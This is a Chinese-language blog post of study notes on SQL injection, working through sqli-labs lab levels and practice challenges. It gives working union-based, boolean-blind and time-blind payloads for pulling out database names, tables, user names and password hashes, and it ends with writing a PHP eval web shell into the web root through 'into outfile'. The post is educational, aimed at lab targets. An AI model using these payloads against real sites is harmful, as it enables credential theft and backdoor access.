---
title: SQL注入
date: 2019-02-05 16:22:35
updated:
tags: [sql注入]
description:
keywords:
comments:
image:
categories:
  - 笔记
---
*这是SQL注入自己学习并且理解的一些例子,使用例子详细展示了常用sql注入的语法与思路*
<!--more-->

# 重要注意项

+ burpsuit注入(repeater)需要url编码


# 手工注入 例子 回显 判断数字注入&字符注入 分析
本例以sqli-labs less1和less2为例

## less1 字符注入
less1 *http://192.168.96.128/sqli-labs/Less-1/*
首先输入`id=1` 回显正常
然后输入`id=1'` 回显报错

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```
报错显示语法错误,分析这一段`'1'' LIMIT 0,1`(最外面的一堆单引号是回显时添加的,这里去除了)这一段是实际输入数据库的语句的一部分,其中`1'`是我们通过`id`传入的参数.我们输入的`1'`然后和原来的`id='参数' limit 0,1`组合,变成了`id='1'' LIMIT 0,1`.
如果是字符型注入我们推测原来的sql语句应该是这样的:
`select 1,2 from ttable where no='1'' limit 0,1;`

然后输入`id=-1`这时回显的内容少了,但是没有报错,因为id为'-1'时查不到内容
再输入`id=1-2`,得到的回显和`id=1`相同

如果是字符型注入
所以我们判断这是字符型注入`1-2`就不会运算,组合后的sql\片段`id='1-2'`只有`id='1'`生效,后面的`-2`会被过滤掉.等同于url输入`id=1`
如果是数字注入`1-2`会运算,得到的回显结果就和url输入`id=-1`一样.
所以less1是字符注入

## less2 数字注入
同上面一样的判断方法,`id=1`回显正常,`id=1'`报错

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
```
分析`' LIMIT 0,1`我们发现只有单引号被报错了.
我们输入的`1'`和原来的`id=参数 limit 0,1`组合变成了`id=1' limit 0,1`

然后输入`id=-1`这时回显内容少了,但是没有报错,因为id为-1时查不到内容
再输入`id=1-2`的好的回显和`id=-1`相同,1-2被运算了,所以是数字型注入




# 手工注入 例子一数字注入 回显 单引号
本例子无法给出测试站点,但是可以直接通过我的描述理解.
## 确定注入点
首页未找到注入点,进入网站公告,url中`id=1`判断为数字型注入
直接添加 单引号 发现页面返回不一样
测试 `id=1 and 1=1 --+` 和`id=1 and 1=2`返回页面不同,注入点存在,判断可以sql注入

## 判断原本sql语句查询的字段数目

```
id=1 order by 1 --+ //意思是按照第三列(字段)排序,返回正常
id=1 order by 2 --+ //正常
id=1 order by 3 --+ //正常
id=1 order by 4 --+ //正常
id=1 order by 5 --+ //返回不同,判断没有第五列(字段)
```
由此判断原本sql语句查询的字段数目为4位

## 判断页面中显示的数据的位置

```
id=-1 union select 1,2,3,4//id=-1让原本语句查不到数据,然后使用联合查询查询1,2,3,4
```
查看页面返回,返回的只有我们自己构造的联合查询数据,返回的数据是2,3.
那么我们得出结论,查询出的四个位置就是2,3两个位置被显示在了网页上.

## 爆出数据库
### 方法一
利用mysql数据库中的`information_schema`数据库.这个数据库中包含了我们创建的所有数据名,表名,字段名等等很多信息详见:https://e1sewhere.github.io/2018/11/30/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
使用
```
id=-1 union select 1,2,group_concat(schema_name),4 from information_schema.schemata
//查询字段schema_name的全部数据,这个字段包含全部数据名.剩余的三位用数字填充,以满足union使用条件
//函数group_concat()将字段schema_name用逗号连接,变成一条数据.
```
`group_concat()`用法详见:https://e1sewhere.github.io/2018/11/30/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ 搜索`group_concat()`

爆出数据库:`mozhe_Discuz_StormGroup`

### 方法二
我们可以直接查询当前数据库
查询当前用户名和当前数据库
```
id=-1 union select 1,user(),database(),4
```
查询出当前用户`root@localhost`,当前数据库`mozhe_Discuz_StormGroup`
## 爆出数据表
同样使用`information_schema`,由于已经查询出数据库就可以将数据库名作为限定条件,查询出这个数据库所包含的所有表名.

```
id=-1 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'
```
爆出数据表:`StormGroup_member`,`notice`
根据表名称的英文意思,我们可以得知`StormGroup_member`是我所需要的表

## 爆出字段
同样使用`information_schema`,由于已经查询出数据库可以用库作为限定条件查询这个库包中含的所有字段.

```
id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='stormgroup_member'
```
查看字段可以得出我们需要的两个字段:name,password
## 爆出数据
直接从数据表中使用`group_concat()`函数查询出这两个字段的所有数据行

```
id=1 union select 1,group_concat(name),group_concat(password),4 from mozhe_Discuz_StormGroup.StormGroup
```
查询出两行对应的`name`和`password`.由于`password`是md5密文直接搜索引擎找个md5解密网站解密

## 使用查询处的账号登录
尝试第二个账户可以登录,得到key,目的达成.

# 手工注入 字符型注入 回显 单引号
注入点:http://219.153.49.228:44930/new_list.php?id=tingjigonggao(肯定已经无法访问)
本例子无法给出测试站点,但是可以直接通过我的描述理解.且本例子和上一个例子(数字注入)十分相似,会适当简略讲解

## 确定注入点
首页无,在公告页面判断有注入点
初步使用单引号判断页面产生变化,有注入点
然后使用`' and '1'='1`和`' and '1'='2`两个返回页面不同第一个正常第二个异常,判断注入点确实存在字符注入

## 判断字段数目

```
' order by 5 --+  
```
1-4都返回正常页面,在5的时候返回错误页面,判断字段数目为4

## 判断页面显示字段位置

```
haha' union select 1,2,3,4 --+ 
```
显示2,3 判断字段位置为2,3位

## 爆数据库
两种方法(见上个sql注入例子)使用其中一个

```
haha' union select 1,user(),database(),4 --+
```
得到数据库`mozhe_discuz_stormgroup`
## 爆表

```
haha' union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema='mozhe_discuz_stormgroup'
```
得到表:`stormgroup_member`

## 爆字段

```
haha' union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name='stormgroup_member
```
得到字段:`name,password`

## 爆数据

```
haha' union select 1,group_concat(name),group_concat(password),4 from mozhe_discuz_stormgroup.stormgroup_member --+
```

得到两组数据其中`password`为md5密文

## 登录
解密md5密文,得到两组账户.其中一个可以登录得到flag

# 手工注入 字符 回显 括号闭合
使用sqli-labs靶场 less3
## 判断注入类型
直接输入`id=1`,返回页面变化,判断存在注入
输入`id=1'`,返回错误页

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
```
语法错误,分析`'1'') LIMIT 0,1`,可以看出这是一个字符注入类型,只用单引号去闭合前面的1还不行,我们可以推测出,元语句应该是这样的`('参数')`
所以需要传入`id=1')`来闭合前面的括号,后面的括号用注释符号注释`id=1') --+`
也可以直接传入`id=1-2') --+`比对和`id=-1') --+`的返回页面是否相同来判断是数字注入还是字符注入.

# 手工注入 字符 回显 双引号闭合
使用使用sql-labs靶场 less-4
## 判断注入类型
输入`id=1`页面发生变化,存在注入点
输入`id=1'`回显正常和`id=1`一样
输入`id=1"`回显错误信息,存在双引号注入

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
```
分析错误片段`"1"") LIMIT 0,1`,这里需要同时使用双引号和括号闭合,推测出注入语句`id=1") --+`
输入后返回正常
判断出注入类型为双引号字符注入,同时使用括号闭合.

# 手工注入 盲注 布尔型
使用sql-labs靶场 less-8,使用burpsuit 进行爆破

## 确定注入类型
直接输入`id=1`,再输入`id=1'`页面变化,判断存在单引号sql注入.但是没有回显信息.判断盲注.
**如何判断是布尔型或时间形暂不知道**

## 爆破数据库名称
使用burpsuit抓包,发送到`intruder`选项卡.在`position`子选项卡里编辑注入的sql代码.

### 判断数据库名称长度

```
id=1' and (select length(database()))=§1§ --+
```
paylod选项卡中使用数字类型,设置1-10的字典,部长为1

点击 start attack 开始爆破,判断返回内容大小,确定数据库名称长度为6.
***注意在burpsuit的编辑页面需要编码为url***
### 爆出数据库名称
判断了数据库长度,以此一个字符一个字符爆出数据库名称

例如从第一个字符开始

```
id=1' and 1=(select ascii(substr(database(),1,1))) --+
```
这次的字典为1-255.
之后判断返回内容,查询ascii十进制表,得到对应的字符.

之后的sql语句改变`substr()`函数的第二个参数(第一个是字符串,第二个是取字符的起点,第三个字符是步长)
直到爆出第六个字符,完成爆破
## 爆破数据表
由于数据表有很多只能通过`limit`函数逐个取表判断,爆出一个表的名字的原理和爆出数据库相同这里以`limit 1,1`为例子,也就是`select *`查询出的所有的表的第一个表.

### 爆出数据表的长度

```
id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)=0 --+
```
同理得出表长度

### 爆出数据表的名称
只事例第一个字符

```
id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1 --+
```

## 爆出字段


```
id=1' and (select length(column_name) from information_schema.columns where table_schema='爆出的表名' limit 0,1)=1 --+ //未验证
```


# 注释符被过滤的时间盲注
使用sql-labs靶场 less7
## 判断注入类型
首先输入`id=1`页面变化
输入`id=1'`返回错误

```
You have an error in your SQL syntax
```
不再提示详细错误,只是说明是语法错误,但是依然可以判断,这里存在单引号注入
输入`id=1' --+`
返回错误页面,可以得知注释符号起作用了,而且只用单引号无法闭合,判断有括号,开始测试括号数目.(如果不起作用,返回页面应该和`hid=1`一样)
`id=1') --+` 错误
`id=1')) --+` 正确 判断用一个单引号加两个括号闭合

**注意**一般在sql语句中引号不会括在号的外层,已知注入类型后,增加括号可以判断出括号的数量.

再输入测试语句`id=1')) and 1=1 --+`返回正常页面
`id=1')) and 1=2`返回错误页面(这个less把所有非正常返回都作为语法错误返回)
由此判断可以使用盲注,这里我是用时间型盲注(也可以使用布尔型)

## 爆出数据库长度
利用burpsuit

```
id=1')) and sleep(if(length(database())=1,5,0)) --+
```
或者使用`benchmark()`函数

```
id=1')) and benchmark(if(length(database())=1,5000,0),MD5
('test')) --+
```
## 爆出数据库名称
只演示第一个字段

```
id=1' )) and sleep(if(ascii(substr(database(),1,1))=100,5,0)) --+
```

其后步骤省略


# 数据库导出文件 into outfile
`into outfile` 和` into dumpfile`区别
>若我们想把一个可执行2进制文件用into outfile函数导出，导出后就会被破坏.
>因为into outfile函数会在行末端写入新行，并且会会转义换行符这样的话这个2进制可执行文件就会被破坏。
>这时候我们用into dumpfile 就能导出一个完整能执行的2进制文件，into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。
>在udf提权的时候用到的就是dumpfile。

## 数据库文件导出
直接使用`into outfile`导出文)

```
?id=1')) union select 1,2,3 from myql.user into outfile "E:\\11.txt" --+
// 在使用这个语句之前,已经知道原语句字段数是3
```

回显页面报错

**原因一:权限不够**
需要root权限(通常其他用户没有创建存储过程的权限)才能对数据库读写操作.
测试是否有root权限

```
?id=1')) and (select count(*) from mysql.user)>0 --+;  //通常有查询mysql.user表的权限,就是root用户
```
回显页面,正常,判断有root权限

**原因二:必须在指路径输出**
> `secure_file_priv`这个变量用来限制数据导入和导出,例如`load data`,`into outfile`,`load_file()函数`,这些操作都需要用户有file权限
> 如果参数为空,这个变量没有效果
> 如果参数是目录名,mysql服务器只允许在这个目录下导入导出,这个目录必须存在,mysql不会创建它
> 如果参数为null,服务器禁止导入导出操作
> 这个参数在`MySql 5.7.6`以后的版本引入


可以通过报错回显得到路径,但是本题目没有详细回显,只能猜正确目录是什么
这里不猜了,我们直接切换到服务器端口查看
mysql命令行输入
```
show variables like '%secure%'
```
查询的回显`secure_file_priv`值为空(这里和网上的朋友过程讲解不一样)
于是为了完成less,我们在服务端手动添加`secure_file_priv`
打开mysql路径下的`my.ini`
添加一个变量`secure_file_priv="C:/sqlfile/"`并且确保这个路径存在.
重启数据库然后再次执行命令查看变量

```
mysql> show variables like '%secure%';
+------------------+-------------+
| Variable_name    | Value       |
+------------------+-------------+
| secure_auth      | OFF         |
| secure_file_priv | C:\sqlfile\ |
+------------------+-------------+
```
变量存在了

我们先直接在服务器端执行导出命令

```
mysql> select * from mysql.user into outfile "C:\\sqlfile\\1.txt";
Query OK, 4 rows affected (0.00 sec)
```
可以看到,返回的是成功信息不是一张表,所以sql注入的回显很可能是报错.

我们先试一下sql注入查询当前数据库

```
?id=1')) union select 1,2,database()  into outfile "C:\\sqlfile\\22.txt" --+
```
返回了报错页面

```
You have an error in your SQL syntax //这个提示和之前的所有错误页面相同
```
我们切换到服务端查看路径,已经有`22.txt这个文件了`并且文件内查出了数据库,之后的其他字段,内容查询就和普通的有回显的sql注入相同,不需要盲注.

**我们分析一下`into outfile`**
在`my.ini`文件内添加`secure_file_priv`变量的时候,我们的路径值是形如`"C:\test\tal"`这样的路径.
在sql注入使用`into outfile`时指定的是`"C:\\test\\tal\\test1.txt"`这样的值,这里使用单引号也可以,即使是单引号注入的情况,但是最好和`my.ini`的单双引号符号统一,非常重要的是,这里的路径一定要用双斜杠,不然语法是错的.

## 文件取回本地
这里把文件输出路径写死了,所以导出的文件无法访问.如果没有写死,就可以将文件输出到站点下.这样我们就可以这样写入并访问一句话木马

```
?id=1')) union select 1,'<?php eval($_POST["997"]);?>',3  into outfile "C:\\soft\\phpStudy\\WWW\\sqli-labs\\Less-7\\muma.php" --+
```
然后使用中国菜刀连接,就可以查看下载到服务器的所有文件.


